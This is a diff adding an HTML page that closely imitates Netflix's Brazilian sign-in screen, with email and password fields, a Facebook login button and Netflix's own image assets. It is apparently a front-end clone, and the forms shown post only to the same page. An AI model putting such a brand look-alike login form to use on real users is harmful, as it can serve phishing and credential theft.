@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Netflix</title>
+        <!-- <script src="login.js" type="text/javascript"></script> -->
+        <script src="lanlog.js" type="text/javascript"></script>
+        <link rel="stylesheet" href="login.css">
+    </head>
+    <body onload="setUpLanguage()" onresize="updateView()">
+        <div class="background-wrapper">
+            <img class="background" src="https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcset="https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/5039d301-b891-47b2-b755-553e5c874395/e792888a-2c70-4a78-9dfd-b8a26e767ae4/BR-en-20200210-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt>
+        </div>
+        <div id="app">
+            <div id="header">
+                <a href="https://www.netflix.com/">
+                    <img id="logo" src="https://logodownload.org/wp-content/uploads/2014/10/netflix-logo-5.png">
+                </a>
+            </div>
+            <div id="container">
+                <form id="log-in-form" action="" method="POST">
+                    <div class="label-container">
+                        <h2 id="sign-in-text"></h1>
+                    </div>
+        
+                    <div class="box-container" id="email-container">
+            
+                        <input class="field" id="email-field" name="email" type="text" oninput="update('email-field', 'email-label', 'email-inputError')" onfocus="inputOnFocus('email-field', 'email-label', 'email-container')" onblur="inputOnBlur('email-field', 'email-label', 'email-container', 'email-inputError')" required>
+                        <label class="label" id="email-label" for="email-field"></label>
+                    </div>
+                    <div class="inputError" id="email-inputError"></div>
+                    <div class="box-container" id="pwd-container">
+            
+                        <input class="field" id="pwd-field" name="password" type="password" oninput="update('pwd-field', 'pwd-label', 'pwd-inputError')" onfocus="inputOnFocus('pwd-field', 'pwd-label', 'pwd-container')" onblur="inputOnBlur('pwd-field', 'pwd-label', 'pwd-container', 'pwd-inputError')" required>
+                        <label class="label" id="pwd-label" for="pwd-field"></label>
+                    </div>
+                    <div class="inputError" id="pwd-inputError"></div>
+                    <div class="box-container" id="login-button-container">
+                        <input id="login-button" type="submit" value="Sign In">
+                    </div>
+                    <div class="checkbox-row">
+                        <span class="checkbox-container" tabindex="0" id="checkbox" onclick="toggleCheckBox()" onblur="checkBoxOnBlur()">
+                            <svg id="icon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="check" class="svg-inline--fa fa-check fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M173.898 439.404l-166.4-166.4c-9.997-9.997-9.997-26.206 0-36.204l36.203-36.204c9.997-9.998 26.207-9.998 36.204 0L192 312.69 432.095 72.596c9.997-9.997 26.207-9.997 36.204 0l36.203 36.204c9.997 9.997 9.997 26.206 0 36.204l-294.4 294.401c-9.998 9.997-26.207 9.997-36.204-.001z"></path></svg>
+                        </span>
+                        <label id="remember-me-label" onclick="toggleCheckBox()"></label>
+                        
+                        <a href="https://www.netflix.com/br/LoginHelp">
+                            <label id="help"></label>
+                        </a>
+                    </div>
+                </form>
+                <form action="" method="POST" class="fb-login-form">
+                    <button class="fb-login-button" type="submit">
+                        <div class="fb-login">
+                            <img class="fb-icon" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png">
+                            <span class="fb-btn-text" id="fb-btn-text"></span>
+                        </div>
+                    </button>
+                </form>
+                <div class="sign-up">
+                    <span id="sign-up"></span>
+                    <a class="sign-up-link" id="sign-up-link" href="https://www.netflix.com/br-en/"></a>
+                </div>
+                <div class="reCAPTCHA">
+                    <p id="reCAPTCHA-text">
+                        <span id="reCAPInfo"></span>
+                        <span class="learn-more-button">
+                            <button id="learn-more" onclick="showTermsOfUse()"></button>
+                        </span>
+                    </p>
+                    <div id="terms-of-use">
+                        <span>
+                            <span id="reCAP1"></span>
+                            <a class="blue-link" id="reCAP2" href="https://policies.google.com/terms"></a>
+                            <span id="reCAP3"></span>
+                            <a class="blue-link" id="reCAP4" href="https://policies.google.com/terms"></a>
+                            <span id="reCAP5"></span>
+                        </span>
+                    </div>
+                </div>
+            </div>
+            <footer>
+                <div class="footer" id="footer">
+                    <p class="footer-header">
+                        <span id="footer-header"></span>
+                        <a class="footer-link">0800-761-4632</a>
+                    </p>
+                    <ul class="inline-footer-ul">
+                        <li class="inline-footer-li">
+                            <a class="footer-link" href="https://help.netflix.com/legal/giftterms" id="gift"></a>
+                        </li>
+                        <li class="inline-footer-li">
+                            <a class="footer-link" href="https://help.netflix.com/legal/termsofuse" id="terms"></a>
+                        </li>
+                        <li class="inline-footer-li">
+                            <a class="footer-link" href="https://help.netflix.com/legal/privacy" id="privacy"></a>
+                        </li>
+                    </ul>
+                    <div class="language-selector-container">
+                        <div class="language-selector-boundaries">
+                            <select name="language" id="language-selector" onchange="loadTexts(getSelectedLanguage())">
+                                <option value="en">English</option>
+                                <option value="pt">Português</option>
+                            </select>
+                            <img class="globe-icon" src="https://climefish.eu/wp-content/uploads/sites/18/2017/08/icon-globe-400px.png">
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+    </body>
+    <script src="login.js" type="text/javascript"></script>
+</html>
